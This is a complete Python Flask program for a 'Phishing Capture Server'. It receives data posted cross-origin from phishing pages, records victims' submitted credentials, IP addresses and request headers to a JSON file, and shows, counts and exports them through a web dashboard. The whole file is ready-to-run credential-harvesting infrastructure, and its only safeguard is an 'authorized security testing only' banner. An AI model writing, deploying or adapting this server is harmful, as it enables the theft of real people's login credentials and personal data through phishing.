from flask import Flask, request, jsonify, render_template_string, send_from_directory
from flask_cors import CORS
from datetime import datetime
import json
import os

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# Storage
CAPTURES_FILE = "captured_data.json"
captures = []

# Load existing captures
if os.path.exists(CAPTURES_FILE):
    try:
        with open(CAPTURES_FILE, 'r') as f:
            captures = json.load(f)
    except:
        captures = []

def save_captures():
    """Save captures to file"""
    with open(CAPTURES_FILE, 'w') as f:
        json.dump(captures, f, indent=2)

@app.route('/')
def home():
    """Home page"""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Phishing Capture Server</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                max-width: 800px;
                margin: 50px auto;
                padding: 20px;
                background: #f5f5f5;
            }
            .container {
                background: white;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            h1 {
                color: #e74c3c;
                text-align: center;
            }
            .status {
                background: #27ae60;
                color: white;
                padding: 15px;
                border-radius: 5px;
                text-align: center;
                margin: 20px 0;
            }
            .info {
                background: #ecf0f1;
                padding: 15px;
                border-radius: 5px;
                margin: 10px 0;
            }
            a {
                display: inline-block;
                background: #3498db;
                color: white;
                padding: 10px 20px;
                text-decoration: none;
                border-radius: 5px;
                margin: 10px 5px;
            }
            a:hover {
                background: #2980b9;
            }
            .warning {
                background: #fff3cd;
                border: 2px solid #ffc107;
                padding: 15px;
                border-radius: 5px;
                margin: 20px 0;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎣 Phishing Capture Server</h1>
            
            <div class="status">
                ✅ Server is RUNNING
            </div>
            
            <div class="info">
                <strong>Captured Records:</strong> {{ count }}
            </div>
            
            <div class="warning">
                ⚠️ <strong>WARNING:</strong> For authorized security testing only!
            </div>
            
            <div style="text-align: center;">
                <a href="/view">📊 View Captured Data</a>
                <a href="/stats">📈 Statistics</a>
                <a href="/clear" onclick="return confirm('Clear all data?')">🗑️ Clear Data</a>
            </div>
            
            <div class="info" style="margin-top: 30px;">
                <strong>API Endpoints:</strong><br>
                POST /capture - Receive captured data<br>
                GET /view - View all captures<br>
                GET /stats - View statistics<br>
                GET /export - Export as JSON<br>
                GET /clear - Clear all data
            </div>
        </div>
    </body>
    </html>
    """
    return render_template_string(html, count=len(captures))

@app.route('/capture', methods=['POST', 'OPTIONS'])
def capture():
    """Receive captured data"""
    # Handle preflight
    if request.method == 'OPTIONS':
        return '', 204
    
    try:
        data = request.get_json()
        
        # Add server timestamp
        data['server_timestamp'] = datetime.now().isoformat()
        data['ip_address'] = request.remote_addr
        data['headers'] = dict(request.headers)
        
        # Store
        captures.append(data)
        save_captures()
        
        print(f"\n{'='*70}")
        print(f"🎯 NEW CAPTURE: {data.get('type', 'unknown')}")
        print(f"{'='*70}")
        
        if data.get('type') == 'credentials_captured':
            print("🔑 CREDENTIALS CAPTURED!")
            print(json.dumps(data.get('formData', {}), indent=2))
        
        print(f"\nTotal captures: {len(captures)}")
        print(f"{'='*70}\n")
        
        return jsonify({
            'status': 'success',
            'message': 'Data captured',
            'capture_id': len(captures)
        })
        
    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 400

@app.route('/view')
def view():
    """View all captured data"""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Captured Data</title>
        <style>
            body {
                font-family: 'Courier New', monospace;
                background: #1e1e1e;
                color: #d4d4d4;
                padding: 20px;
            }
            .header {
                background: #252526;
                padding: 20px;
                border-radius: 5px;
                margin-bottom: 20px;
            }
            h1 {
                color: #4ec9b0;
                margin: 0;
            }
            .stats {
                display: flex;
                gap: 20px;
                margin: 20px 0;
            }
            .stat-box {
                background: #2d2d30;
                padding: 15px;
                border-radius: 5px;
                flex: 1;
            }
            .stat-number {
                font-size: 32px;
                color: #4ec9b0;
                font-weight: bold;
            }
            .capture {
                background: #252526;
                border-left: 4px solid #007acc;
                padding: 15px;
                margin: 10px 0;
                border-radius: 3px;
            }
            .capture.credentials {
                border-left-color: #f48771;
            }
            .capture-type {
                color: #4ec9b0;
                font-weight: bold;
                font-size: 14px;
            }
            .timestamp {
                color: #858585;
                font-size: 12px;
            }
            .data {
                background: #1e1e1e;
                padding: 10px;
                margin: 10px 0;
                border-radius: 3px;
                overflow-x: auto;
            }
            .sensitive {
                color: #f48771;
                font-weight: bold;
            }
            .buttons {
                margin: 20px 0;
            }
            button {
                background: #007acc;
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 3px;
                cursor: pointer;
                margin-right: 10px;
            }
            button:hover {
                background: #005a9e;
            }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>🎯 Captured Data Dashboard</h1>
        </div>
        
        <div class="stats">
            <div class="stat-box">
                <div class="stat-number">{{ total }}</div>
                <div>Total Captures</div>
            </div>
            <div class="stat-box">
                <div class="stat-number">{{ credentials }}</div>
                <div>Credentials Captured</div>
            </div>
            <div class="stat-box">
                <div class="stat-number">{{ visits }}</div>
                <div>Page Visits</div>
            </div>
        </div>
        
        <div class="buttons">
            <button onclick="location.reload()">🔄 Refresh</button>
            <button onclick="location.href='/export'">📥 Export JSON</button>
            <button onclick="location.href='/clear'">🗑️ Clear All</button>
            <button onclick="location.href='/'">🏠 Home</button>
        </div>
        
        <h2>📋 Recent Captures:</h2>
        
        {% for capture in captures[::-1] %}
        <div class="capture {% if capture.type == 'credentials_captured' %}credentials{% endif %}">
            <div class="capture-type">{{ capture.type | upper }}</div>
            <div class="timestamp">{{ capture.timestamp }}</div>
            
            {% if capture.type == 'credentials_captured' %}
            <div class="data">
                <strong class="sensitive">🔑 CREDENTIALS:</strong>
                <pre>{{ capture.formData | tojson(indent=2) }}</pre>
            </div>
            {% endif %}
            
            {% if capture.type == 'page_visit' %}
            <div class="data">
                <strong>🌐 URL:</strong> {{ capture.url }}<br>
                <strong>👤 User Agent:</strong> {{ capture.user_agent }}<br>
                <strong>📱 Platform:</strong> {{ capture.platform }}
            </div>
            {% endif %}
            
            <div class="data">
                <strong>📍 IP:</strong> {{ capture.ip_address }}<br>
                <strong>⏰ Server Time:</strong> {{ capture.server_timestamp }}
            </div>
        </div>
        {% endfor %}
    </body>
    </html>
    """
    
    credentials_count = sum(1 for c in captures if c.get('type') == 'credentials_captured')
    visits_count = sum(1 for c in captures if c.get('type') == 'page_visit')
    
    return render_template_string(
        html,
        captures=captures,
        total=len(captures),
        credentials=credentials_count,
        visits=visits_count
    )

@app.route('/stats')
def stats():
    """Show statistics"""
    types = {}
    for capture in captures:
        t = capture.get('type', 'unknown')
        types[t] = types.get(t, 0) + 1
    
    return jsonify({
        'total_captures': len(captures),
        'by_type': types,
        'latest': captures[-1] if captures else None
    })

@app.route('/export')
def export():
    """Export all data as JSON"""
    return jsonify(captures)

@app.route('/clear')
def clear():
    """Clear all captures"""
    global captures
    captures = []
    save_captures()
    return jsonify({'status': 'success', 'message': 'All data cleared'})

@app.route('/health')
def health():
    """Health check"""
    return jsonify({'status': 'ok', 'captures': len(captures)})

if __name__ == '__main__':
    print("\n" + "="*70)
    print("🎣 PHISHING CAPTURE SERVER")
    print("="*70)
    print("\n✅ Server starting...")
    print(f"📊 Dashboard: http://localhost:5000")
    print(f"👁️  View data: http://localhost:5000/view")
    print(f"📡 Capture endpoint: http://localhost:5000/capture")
    print("\n⚠️  For authorized security testing only!")
    print("="*70 + "\n")
    
    app.run(host='0.0.0.0', port=5000, debug=True)